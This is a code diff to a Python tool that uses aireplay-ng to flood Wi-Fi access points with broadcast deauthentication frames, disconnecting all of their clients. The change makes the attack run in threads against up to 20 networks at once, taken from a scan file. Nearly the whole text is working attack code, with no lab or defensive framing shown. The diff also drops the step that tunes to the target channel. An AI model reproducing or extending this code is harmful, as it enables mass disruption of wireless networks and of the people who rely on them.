@@ -74,7 +74,7 @@ def deauth(interface, num_pkts_to_send, ap_mac, ap_channel, ap_essid):
 	
 	This function uses aireplay-ng to send deauth packets to ALL clients connected
 	to the target AP using broadcast addressing. This is more effective than
-	targeting the AP alone.
+	targeting the AP alone. Thread-safe for concurrent attacks.
 	
 	Args:
 		interface (str): The wireless interface in monitor mode
@@ -86,14 +86,9 @@ def deauth(interface, num_pkts_to_send, ap_mac, ap_channel, ap_essid):
 	Returns:
 		None: Prints timing information about the attack duration
 	"""
-	global current_channel
 	try:
-		print("Deauthing", ap_essid, "(", ap_mac, ") on channel", ap_channel, "num of packets: ", num_pkts_to_send, "...")
-		
-		# Only hop channels if we're not already on the target channel
-		# This optimization reduces latency and improves attack efficiency
-		if(current_channel != ap_channel):
-			hop_channel(interface, ap_channel)
+		thread_id = threading.current_thread().name
+		print(f"[{thread_id}] Deauthing {ap_essid} ({ap_mac}) on channel {ap_channel}")
 		
 		# Record start time for performance measurement
 		date = datetime.datetime.now()
@@ -105,23 +100,26 @@ def deauth(interface, num_pkts_to_send, ap_mac, ap_channel, ap_essid):
 		# This sends deauth frames that appear to come from the AP to all connected clients
 		cmd = ['aireplay-ng', '-0', str(num_pkts_to_send), '-a', ap_mac, '-c', 'FF:FF:FF:FF:FF:FF', interface]
 		
-		print(f"  Command: {' '.join(cmd)}")
+		# Run attack
 		process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 		stdout, stderr = process.communicate()
 		
 		# Check for errors
-		if stderr:
-			err_msg = stderr.decode().strip()
-			if err_msg and "ioctl" not in err_msg:  # Ignore ioctl warnings
-				print(f"  Warning: {err_msg}")
+		if process.returncode != 0:
+			err_msg = stderr.decode().strip() if stderr else "Unknown error"
+			if "ioctl" not in err_msg:  # Ignore ioctl warnings
+				print(f"[{thread_id}] ERROR: {err_msg}")
+				return False
 		
 		# Calculate and display how long the attack took
 		date2 = datetime.datetime.now()
-		print("Delta time =",date2-date)
+		duration = (date2 - date).total_seconds()
+		print(f"[{thread_id}] Completed in {duration:.1f}s")
+		return True
 
-	except KeyboardInterrupt:
-		print("Stopping")
-		exit(0)
+	except Exception as e:
+		print(f"[{threading.current_thread().name}] Exception: {e}")
+		return False
 
 def read_csv(directory, file_name):
 	"""
@@ -253,30 +251,43 @@ def deauth_from_csv(file_dir, file_name, interface, num_pkts_to_send, target_ess
 		# Sort by signal strength (strongest first)
 		my_list.sort(key=lambda x: x[3])
 		
+		# Limit simultaneous attacks to prevent resource exhaustion
+		max_concurrent = min(len(my_list), 20)  # Max 20 concurrent attacks
+		if len(my_list) > max_concurrent:
+			print(f"Note: Limiting to {max_concurrent} concurrent attacks (out of {len(my_list)} total)")
+		
 		# Create threads for each AP attack
 		threads = []
-		for idx, lst in enumerate(my_list, 1):
-			print(f"[{idx}/{len(my_list)}] Starting attack on {lst[2]} ({lst[0]})")
+		for idx, lst in enumerate(my_list[:max_concurrent], 1):
+			print(f"[{idx}/{max_concurrent}] Starting attack on {lst[2]} ({lst[0]})")
 			
-			# Create thread for this AP
+			# Create thread for this AP (daemon=False so they complete)
 			thread = threading.Thread(
 				target=deauth,
 				args=(interface, num_pkts_to_send, lst[0], lst[1], lst[2]),
-				daemon=True
+				daemon=False,
+				name=f"Deauth-{lst[2][:8]}"
 			)
 			threads.append(thread)
 			thread.start()
+			
+			# Small delay to prevent overwhelming the system
+			time.sleep(0.05)
 		
 		# Update LCD to show simultaneous attack
 		if LCD_AVAILABLE:
-			display_status(f"Attacking {len(my_list)}", "Simultaneously")
+			display_status(f"Attacking {len(threads)}", "Simultaneously")
 		
-		print(f"\nAll {len(threads)} attacks launched simultaneously!")
+		print(f"\nAll {len(threads)} attacks running!")
 		print("Waiting for attacks to complete...")
 		
-		# Wait for all threads to finish
-		for thread in threads:
-			thread.join()
+		# Wait for all threads to finish with timeout
+		for idx, thread in enumerate(threads, 1):
+			thread.join(timeout=60)  # 60 second timeout per thread
+			if thread.is_alive():
+				print(f"Warning: Thread {idx} still running after timeout")
+			else:
+				print(f"Thread {idx}/{len(threads)} completed")
 		
 		print("All attacks completed!")
 	else:
